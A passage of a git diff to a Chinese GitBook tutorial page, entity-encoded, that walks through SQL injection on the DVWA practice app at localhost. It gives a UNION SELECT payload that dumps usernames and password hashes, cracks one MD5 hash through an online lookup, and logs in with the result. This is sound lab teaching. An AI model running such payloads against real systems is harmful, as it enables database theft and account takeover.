+<p>or &#x6BCF;&#x4E00;&#x7EC4;&quot;user--password&quot;&#x6570;&#x636E;&#x4FE1;&#x606F;&#x6362;&#x884C;&#x8F93;&#x51FA;
+ <code>1&apos; union select 1,concat_ws(&apos;--&apos;,user,password) from users #</code></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-693791e952503e79.png?imageMogr2/auto-orient/strip|imageView2/2/w/485/format/webp" alt="img"></p>
+<h4 id="7&#x9A8C;&#x8BC1;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x7684;&#x6709;&#x6548;&#x6027;">7.&#x9A8C;&#x8BC1;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x7684;&#x6709;&#x6548;&#x6027;</h4>
+<p><strong>1&#xFF09;&#x89E3;&#x5BC6;</strong>
+ &#x4ECE;&#x4EE5;&#x4E0A;&#x7B2C;6&#x6B65;&#x4E2D;&#x83B7;&#x53D6;&#x7684;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x4E2D;&#xFF0C;&#x4EFB;&#x610F;&#x53D6;&#x4E00;&#x7EC4;&quot;user--password&quot;&#x5BF9;&#x5E94;&#x503C;&quot;gordonb--e99a18c428cb38d5f260853678922e03&quot;&#xFF0C;&#x5BC6;&#x7801;&#x662F;&#x52A0;&#x5BC6;&#x8FC7;&#x7684;&#xFF0C;&#x5F53;&#x4E0D;&#x77E5;&#x9053;&#x5177;&#x4F53;&#x52A0;&#x5BC6;&#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5C1D;&#x8BD5;&#x591A;&#x79CD;&#x89E3;&#x5BC6;&#x7684;&#x65B9;&#x5F0F;&#x53BB;&#x7834;&#x89E3;&#x3002;
+ &#x6BD4;&#x5982;&#x53EF;&#x4EE5;&#x5148;&#x7528;&#x5E38;&#x89C4;&#x7684;MD5&#x89E3;&#x5BC6;&#x68C0;&#x6D4B;&#x4E00;&#x4E0B;&#x662F;&#x5426;&#x80FD;&#x7834;&#x89E3;&#xFF0C;&#x89E3;&#x5BC6;&#x4F20;&#x9001;&#x95E8;&#xFF1A;<a href="http://www.cmd5.com/" target="_blank">http://www.cmd5.com/</a></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-686bcc517555cd2f.png?imageMogr2/auto-orient/strip|imageView2/2/w/531/format/webp" alt="img"></p>
+<p>&#x89E3;&#x5BC6;&#x540E;&#xFF1A;gordonb--abc123</p>
+<p><strong>2&#xFF09;&#x9A8C;&#x8BC1;&#x6570;&#x636E;&#x6709;&#x6548;&#x6027;</strong>
+ &#x56DE;&#x5230;&#x524D;&#x7AEF;&#x767B;&#x5F55;&#x754C;&#x9762;&#xFF1A;<a href="http://localhost:8001/dvwa/login.php" target="_blank">http://localhost:8001/dvwa/login.php</a>
+ &#x5C06;&#x4EE5;&#x4E0A;&#x89E3;&#x5BC6;&#x51FA;&#x7684;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x586B;&#x5199;&#x5230;&#x767B;&#x5F55;&#x8F93;&#x5165;&#x6846;&#x4E2D;&#xFF0C;&#x63D0;&#x4EA4;&#x6821;&#x9A8C;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-ce037a5c0155e52e.png?imageMogr2/auto-orient/strip|imageView2/2/w/424/format/webp" alt="img"></p>
+<p>&#x767B;&#x5F55;&#x6210;&#x529F;</p>
 
                                 
                                 </section>
@@ -409,7 +590,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"SQL注入","level":"3.1.2","depth":2,"previous":{"title":"文件泄露","level":"3.1.1","depth":2,"path":"src/page/chapter10.md","ref":"src/page/chapter10.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"src/page/chapter11.md","mtime":"2020-05-17T07:46:34.923Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-05-17T07:47:36.848Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"SQL注入","level":"3.1.2","depth":2,"previous":{"title":"文件泄露","level":"3.1.1","depth":2,"path":"src/page/chapter10.md","ref":"src/page/chapter10.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"src/page/chapter11.md","mtime":"2020-05-17T07:53:22.011Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-05-17T07:56:21.055Z"},"basePath":"../..","book":{"language":""}});
         });
     </script>
 </div>
